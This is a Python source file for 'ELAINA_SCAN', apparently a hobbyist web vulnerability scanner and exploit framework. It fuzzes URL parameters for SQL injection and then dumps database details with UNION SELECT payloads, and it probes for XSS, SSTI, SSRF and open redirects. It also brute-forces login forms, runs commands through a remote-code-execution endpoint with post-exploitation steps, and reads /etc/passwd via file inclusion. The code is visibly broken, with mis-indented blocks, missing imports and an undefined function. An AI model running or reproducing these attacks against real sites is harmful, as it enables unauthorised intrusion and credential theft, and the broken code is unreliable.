import argparse
import requests
import urllib.parse
import concurrent.futures
import subprocess
import json
from tabulate import tabulate

results = []

def banner():
    print(r"""
 ███████╗██╗      █████╗ ██╗███╗   ██╗ █████╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
 ██╔════╝██║     ██╔══██╗██║████╗  ██║██╔══██╗    ██╔════╝██╔════╝██╔══██╗████╗  ██║
 █████╗  ██║     ███████║██║██╔██╗ ██║███████║    ███████╗██║     ███████║██╔██╗ ██║
 ██╔══╝  ██║     ██╔══██║██║██║╚██╗██║██╔══██║    ╚════██║██║     ██╔══██║██║╚██╗██║
 ███████╗███████╗██║  ██║██║██║ ╚████║██║  ██║    ███████║╚██████╗██║  ██║██║ ╚████║
 ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
                            Web Vuln Scanner - by YURI08
""")

def load_payloads(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Payload error: {e}")
        return []

def parse_params(url):
    return list(urllib.parse.parse_qs(urllib.parse.urlparse(url).query).keys())

def build_url(base_url, param, payload):
    parsed = list(urllib.parse.urlparse(base_url))
    query = dict(urllib.parse.parse_qsl(parsed[4]))
    query[param] = payload
    parsed[4] = urllib.parse.urlencode(query)
    return urllib.parse.urlunparse(parsed)

def request(url, proxy=None):
    try:
        proxies = {"http": proxy, "https": proxy} if proxy else None
        return requests.get(url, timeout=5, proxies=proxies)
    except:
        return None

def try_sql_dump(base_url, param, proxy):
    def dump(payload):
        u = build_url(base_url, param, payload)
        r = request(u, proxy)
        if r:
            print(f"[DUMP] {payload} => {r.text[:100].strip()}")
            results.append({"mode": "sql-dump", "url": u, "result": r.text[:100]})
    print("[*] Attempting SQLi basic data dump...")
    dump("1' UNION SELECT null,@@version-- -")
    dump("1' UNION SELECT null,database()-- -")

def scan_payload(url, param, payload, mode, proxy):
    target_url = build_url(url, param, payload)
    r = request(target_url, proxy)
    if not r: return
    result = {"mode": mode, "url": target_url, "payload": payload, "vulnerable": False}

    if mode == "sql":
        if any(e in r.text.lower() for e in ["mysql", "syntax", "odbc", "sql error"]):
            print(f"[SQLi] {target_url}")
            result["vulnerable"] = True
            results.append(result)
            try_sql_dump(url, param, proxy)

   elif mode == "xss":
    if is_reflected(r.text, payload):
        print(f"[XSS] Reflection detected at {target_url}")
        result["vulnerable"] = True
        results.append(result)


if "sleep" in payload.lower() or "timeout" in payload.lower():
    if check_delay(target_url, proxy):
        print(f"[DELAY] Blind vuln suspected at {target_url}")
        result["vulnerable"] = True
        results.append(result)

def csrf_check(url, proxy):
    r = request(url, proxy)
    if r and "<form" in r.text and "csrf" not in r.text.lower():
        print(f"[CSRF] Possible missing CSRF token: {url}")
        results.append({"mode": "csrf", "url": url, "vulnerable": True})


def nuclei_scan(url, templates=None):
    nuclei_path = shutil.which("nuclei")
    if not nuclei_path:
        print("[!] Nuclei not found in PATH. Install it from https://nuclei.projectdiscovery.io")
        return
    try:
        print(f"[NUCLEI] Scanning {url}...")
        templates_dir = os.path.expanduser("~/.local/nuclei-templates")
        if not os.path.isdir(templates_dir):
            print("[*] Nuclei templates not found. Updating...")
            subprocess.run(["nuclei", "-update-templates"], check=True)
        cmd = ["nuclei", "-u", url]
        if templates:
            cmd += ["-t", templates]
        subprocess.run(cmd, check=True)
    except Exception as e:
        print(f"[!] Nuclei error: {e}")
        
def run_mode(mode, url, payloads, threads, proxy, fuzz_all):
    params = parse_params(url)
    targets = params if fuzz_all else params[:1]

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        for param in targets:
            for payload in payloads:
                executor.submit(scan_payload, url, param, payload, mode, proxy)

def run_full_scan(args):
    for m in ["sql", "xss", "csrf", "nuclei"]:
        args.mode = m
        run_scan(args)

def run_cve_scan(cve_id):
    print(f"[CVE] Checking {cve_id}...")
    try:
        r = requests.get(f"https://cve.circl.lu/api/cve/{cve_id}")
        if r.status_code == 200:
            data = r.json()
            print(f"[CVE] {data['id']} - {data['summary']}")
            results.append({"mode": "cve", "url": cve_id, "payload": data['summary'], "vulnerable": True})
        else:
            print("[!] CVE not found.")
    except Exception as e:
        print(f"[!] Error checking CVE: {e}")

def check_cve(cve_id):
    url = f"https://cve.circl.lu/api/cve/{cve_id}"
    r = requests.get(url)
    if r.ok:
        data = r.json()
        print(f"[CVE] {data['id']} - {data['summary']}")

def run_scan(args):
    if args.mode == "bruteforce":
    run_bruteforce(args.url, args.userlist, args.passlist)
    if args.mode == "cve":
    run_cve_scan(args.url)  # args.url là CVE ID ví dụ: CVE-2021-41773
    if args.mode == "fullscan":
        run_full_scan(args)
        return
    if args.mode == "csrf":
        csrf_check(args.url, args.proxy)
        return
    if args.mode == "nuclei":
    nuclei_scan(args.url, args.template)
  return
    if not args.payload:
        print("[!] You must provide a --payload file for SQL/XSS modes.")
        return
    payloads = load_payloads(args.payload)
    run_mode(args.mode, args.url, payloads, args.thread, args.proxy, args.fuzz_params)

def detect_ssti(url, param, payloads, proxy):
    for payload in payloads:
        test_url = build_url(url, param, payload)
        r = request(test_url, proxy)
        if r and "49" in r.text:
            print(f"[SSTI] Possible SSTI at {test_url}")
            results.append({"mode": "ssti", "url": test_url, "payload": payload, "vulnerable": True})

def detect_open_redirect(url, param, payloads, proxy):
    for payload in payloads:
        test_url = build_url(url, param, payload)
        r = request(test_url, proxy)
        if r and r.is_redirect:
            location = r.headers.get("Location", "")
            if "evil.com" in location:
                print(f"[REDIRECT] Open redirect at {test_url}")
                results.append({"mode": "redirect", "url": test_url, "location": location})

def detect_ssrf(url, param, payloads, proxy):
    for payload in payloads:
        test_url = build_url(url, param, payload)
        r = request(test_url, proxy)
        if r and any(e in r.text.lower() for e in ["connection refused", "timeout", "127.0.0.1"]):
            print(f"[SSRF] Possible SSRF at {test_url}")
            results.append({"mode": "ssrf", "url": test_url, "payload": payload, "vulnerable": True})

def run_bruteforce(url, userlist, passlist):
    if not userlist or not passlist:
        print("[!] Missing wordlists.")
        return
    with open(userlist) as ufile, open(passlist) as pfile:
        users = [u.strip() for u in ufile]
        passwords = [p.strip() for p in pfile]
    for user in users:
        for pwd in passwords:
            data = {'username': user, 'password': pwd}
            try:
                r = requests.post(url, data=data, timeout=5)
                if "invalid" not in r.text.lower():
                    print(f"[LOGIN] {user}:{pwd} => Possibly Valid")
                    results.append({"mode": "bruteforce", "url": url, "payload": f"{user}:{pwd}", "vulnerable": True})
            except:
                continue
                
def infer_param_type(url, param):
    parsed = list(urllib.parse.urlparse(url))
    query = dict(urllib.parse.parse_qsl(parsed[4]))
    val = query.get(param, "")
    if val.isdigit(): return "int"
    if val in ["true", "false"]: return "bool"
    if "/" in val: return "path"
    return "str"
def is_reflected(response_text, payload):
    return payload.lower() in response_text.lower()

# ===== Exploit & Post Exploit =====

def exploit_rce(url, cmd, proxy):
    payload = urllib.parse.quote(cmd)
    target_url = f"{url}{payload}"
    r = request(target_url, proxy)
    if r:
        print(f"[RCE] Response:\n{r.text}")
        results.append({"mode": "rce", "url": target_url, "output": r.text[:300]})

def exploit_lfi(url, file_path, proxy):
    payload = urllib.parse.quote(file_path)
    target_url = f"{url}{payload}"
    r = request(target_url, proxy)
    if r:
        print(f"[LFI] Content from {file_path}:\n{r.text[:300]}")
        results.append({"mode": "lfi", "url": target_url, "output": r.text[:300]})

def exploit_upload():
    print("[!] Upload exploit not implemented.")

def post_exploit_rce(url, proxy):
    for cmd in ["whoami", "id", "uname -a"]:
        print(f"\n[POST-RCE] Running: {cmd}")
        exploit_rce(url, cmd, proxy)

def run_exploit(args):
    if args.exploit == "rce":
        exploit_rce(args.url, args.cmd or "whoami", args.proxy)
    elif args.exploit == "lfi":
        exploit_lfi(args.url, args.file or "/etc/passwd", args.proxy)
    elif args.exploit == "upload":
        exploit_upload()
    else:
        print("[!] Unsupported exploit.")

def run_post(args):
    if args.exploit == "rce":
        post_exploit_rce(args.url, args.proxy)
    else:
        print("[!] Post-exploit only supports RCE.")


def save_results(path):
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2)
        print(f"[+] Results saved to: {path}")
    except Exception as e:
        print(f"[!] Failed to save results: {e}")

def show_summary():
    if results:
        table = [[r.get("mode"), r.get("url"), r.get("payload", r.get("cmd", r.get("file", "-"))), "✔" if r.get("vulnerable", False) else ""] for r in results]
        print("\n=== Scan Summary ===")
        print(tabulate(table, headers=["Type", "URL", "Payload/File/Cmd", "Vulnerable"], tablefmt="fancy_grid"))
    else:
        print("[!] No vulnerabilities found.")

def display_results():
    if not results:
        print("[*] No vulnerabilities found.")
        return
    table = []
    headers = ["Mode", "URL", "Payload", "Vulnerable"]
    for res in results:
        table.append([
            res.get("mode", ""),
            res.get("url", ""),
            res.get("payload", ""),
            res.get("vulnerable", "")
        ])
    print(tabulate(table, headers=headers, tablefmt="grid"))

def main():
    banner()
    parser = argparse.ArgumentParser(description="ELAINA_SCAN - Vuln/Exploit Framework")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-m", "--mode", required=True, help="Mode: sql, xss, csrf, nuclei, fullscan, exploit, post")
    parser.add_argument("-payload", help="Payload file path")
    parser.add_argument("-thread", type=int, default=5, help="Thread count")
    parser.add_argument("-proxy", help="Proxy (http://127.0.0.1:8080)")
    parser.add_argument("--fuzz-params", action="store_true", help="Fuzz all query params")
    parser.add_argument("--output", help="Save results to JSON")
    parser.add_argument("--exploit", help="Exploit type: rce, lfi, upload")
    parser.add_argument("--cmd", help="Command for RCE")
    parser.add_argument("--file", help="File to read (LFI)")
    parser.add_argument("--template", help="Path to custom Nuclei templates")
    parser.add_argument("--userlist", help="Username wordlist")
    parser.add_argument("--passlist", help="Password wordlist")
    parser.add_argument("--bruteforce", help="Attack brute force login")
 args = parser.parse_args()

    if args.mode == "exploit":
        run_exploit(args)
    elif args.mode == "post":
        run_post(args)
    else:
        run_scan(args)

    display_results()

    if args.output:
        save_results(args.output)

if __name__ == "__main__":
    main()
if args.output:
    save_results(args.output)

show_summary()
